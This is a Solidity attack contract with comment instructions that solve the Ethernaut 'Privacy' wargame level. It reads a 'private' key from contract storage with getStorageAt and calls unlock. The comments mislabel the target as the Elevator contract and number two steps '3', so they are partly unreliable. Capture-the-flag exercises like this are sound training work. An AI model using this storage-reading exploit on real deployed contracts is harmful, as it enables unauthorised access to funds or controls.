/*
Tools needed for this level:
- Console
- Remix IDE

1.- Copy the Privacy contract to Remix IDE. This is needed for being able to import the code 
    on this file. No need to deploy Privacy.sol.
2.- Deploy this contract (PrivacyAttack.sol) with Remix using the Injected Web3 environment
		passing Ethernaut's Elevator contract address to the constructor. 
3.- Obtain the bytes32 key stored in the contract storage via the console:
			await web3.eth.getStorageAt(instance, 5)
3.- Execute the unlock function passing the bytes32 value obtained.
4.- Check if contract is unlocked:
			await contract.locked()
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Privacy.sol";

contract PrivacyAttack {

	Privacy privacy;

	constructor(address privacyAddr) {
		privacy = Privacy(privacyAddr);
	}

	function unlock(bytes32 _key) public {
		bytes16 key = bytes16(_key);
		privacy.unlock(key);
	}
}